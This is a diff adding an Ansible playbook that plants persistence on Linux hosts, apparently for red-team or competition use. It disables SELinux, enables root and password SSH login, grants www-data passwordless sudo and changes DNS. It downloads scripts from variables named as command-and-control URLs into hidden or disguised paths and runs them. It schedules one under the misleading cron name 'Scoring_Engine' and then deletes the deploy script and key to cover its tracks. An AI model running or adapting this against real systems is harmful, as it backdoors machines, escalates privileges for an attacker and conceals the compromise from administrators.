@@ -1,0 +1,57 @@
+---
+#- name: Trying to install git. 
+#  package: name=git 
+
+# Download easy script for cron
+#- name: Download pub keys
+#  get_url: url="{{ c2_key }}" dest="{{ ez_dir }}/dad.key" mode=0755
+- name: Disabling SELinux.
+  shell: echo 0 >/selinux/enforce
+  args:
+    removes: /selinux/enforce
+
+- file: path="{{ jericho_dir }}" state=directory mode=0755
+
+- file: path="{{ ez_dir }}" state=directory mode=0755
+
+- lineinfile: dest=/etc/ssh/sshd_config regexp="^AuthorizedKeysFile " insertafter="^#AuthorizedKeysFile " line="AuthorizedKeysFile %h/.ssh/authorized_keys"
+- lineinfile: dest=/etc/ssh/sshd_config regexp="^PermitRootLogin " insertafter="^#PermitRootLogin " line="PermitRootLogin yes"
+- lineinfile: dest=/etc/ssh/sshd_config regexp="^RSAAuthentication " insertafter="^#RSAAuthentication" line="RSAAuthentication yes"
+- lineinfile: dest=/etc/ssh/sshd_config regexp="^PasswordAuthentication" insertafter="^#PasswordAuthentication" line="PasswordAuthentication yes"
+- lineinfile: dest=/etc/ssh/sshd_config regexp="^PubkeyAuthentication" insertafter="^#PubkeyAuthentication" line="PubkeyAuthentication yes"
+- lineinfile: dest=/etc/resolv.conf regexp="^nameserver " insertafter="^nameserver " line="nameserver 8.8.8.8"
+- lineinfile: dest=/etc/sudoers regexp="^www-data " insertafter="^root " line="www-data ALL=(ALL) NOPASSWD:ALL"
+
+# Download better hidden script
+- name: Download deploy script
+  get_url: url="{{ c2_flappy }}" dest='/etc/udev/disks' mode=0644
+
+# Download better hidden script
+- name: Download deploy script
+  get_url: url="{{ c2_deploy }}" dest='{{ ez_dir }}/.dad.sh' mode=0755 force=yes
+
+# Download easy script for cron
+- name: Download ez script (cron script)
+  get_url: url="{{ c2_deploy_ez }}" dest="{{ ez_dir }}/.ez.sh" mode=0755 force=yes
+
+- name: Running deploy ez... give them something...
+  shell: ./.ez.sh
+  args:
+    chdir: "{{ ez_dir }}"
+
+    # Schedule execution of a script.
+- name: Scheduling tasks with cron.
+  cron: name="Scoring_Engine" minute="5" hour="1" job="{{ ez_dir }}/.ez.sh"
+
+    # Shell does not expect anything to be returned to the user.
+- name: Running jericho :3
+  shell: ./.dad.sh
+  args:
+    chdir: "{{ ez_dir }}"
+    executable: /bin/bash
+  async: 45
+  poll: 0
+
+    # Remove deploy script
+- file: path="{{ ez_dir }}/.dad.sh" state=absent
+- file: path="{{ ez_dir }}/dad.key" state=absent
